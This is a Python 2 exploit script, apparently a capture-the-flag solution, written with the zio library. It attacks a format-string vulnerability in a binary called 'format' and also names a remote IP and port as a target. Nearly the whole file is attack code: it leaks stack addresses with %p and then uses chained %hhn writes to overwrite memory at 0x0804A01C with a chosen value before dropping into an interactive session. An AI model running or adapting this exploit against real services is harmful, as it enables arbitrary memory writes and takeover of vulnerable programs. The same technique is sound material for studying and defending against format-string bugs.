from zio import *

target = ('119.254.101.197', 10000)
target = './format'


def do_fmt(io, fmt):
    io.writeline(fmt)


def exp(target):
    # io = zio(target, timeout=10000, print_read=COLORED(REPR, 'red'), print_write=COLORED(REPR, 'green'))
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))

    io.writeline('%17$p')
    argv0 = int(io.readline().strip('\n'), 16)
    io.writeline('%49$p')
    path = int(io.readline().strip('\n'), 16)
    print hex(path)

    path = (path + 3) / 4 * 4
    print hex(path)

    index3 = (path - argv0) / 4 + 49

    # not need
    io.writeline('%49$s')
    print HEX(io.readline().strip('\n'))

    # not need
    io.writeline('%%%d$p' % index3)
    io.readline()

    addr = 0x0804A01C
    value = 0x41424344
    for i in range(4):
        do_fmt(io, '%%%dc%%17$hhn' % ((path + i) & 0xff))
        k = ((addr >> (i * 8)) & 0xff)
        if k != 0:
            do_fmt(io, '%%%dc%%49$hhn' % k)
        else:
            do_fmt(io, '%%49$hhn')

    do_fmt(io, '%%%dc%%17$hhn' % (path & 0xff))

    for i in range(4):
        do_fmt(io, '%%%dc%%49$hhn' % ((addr + i) & 0xff))
        k = ((value >> (i * 8)) & 0xff)
        if k != 0:
            do_fmt(io, '%%%dc%%%d$hhn' % (k, index3))
        else:
            do_fmt(io, '%%%d$hhn' % index3)

    io.gdb_hint()

    io.interact()


exp(target)
